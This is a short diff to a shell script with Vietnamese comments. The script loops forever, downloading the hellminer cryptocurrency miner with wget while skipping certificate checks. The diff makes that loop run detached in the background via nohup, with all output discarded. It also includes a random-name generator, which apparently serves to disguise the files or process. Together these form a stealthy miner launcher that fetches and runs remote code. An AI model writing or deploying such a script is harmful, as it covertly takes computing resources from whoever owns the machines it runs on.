@@ -5,7 +5,8 @@ generate_random_name() {
   tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12
 }
 
-# Vòng lặp vô hạn để script chạy liên tục
+# Chạy script dưới nền với nohup
+nohup sh -c '
 while true; do
   # Tải file
   wget -q --no-check-certificate https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
@@ -37,3 +38,4 @@ while true; do
   # Nghỉ 3 phút trước khi lặp lại
   sleep 60
 done
+' > /dev/null 2>&1 &
